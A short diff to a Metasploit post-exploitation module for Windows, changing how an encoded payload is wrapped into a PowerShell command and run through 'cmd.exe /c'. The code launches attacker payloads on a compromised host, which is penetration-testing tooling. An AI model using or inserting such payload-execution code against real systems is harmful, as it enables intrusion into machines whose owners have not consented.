@@ -25,7 +25,7 @@ module Msf::Post::Windows::Runas
   end
 
   def execute_psh
-    powershell_command = cmd_psh_payload(payload.encoded)
+    powershell_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
     command = 'cmd.exe'
     args = "/c #{powershell_command}"
     shell_exec(command, args)
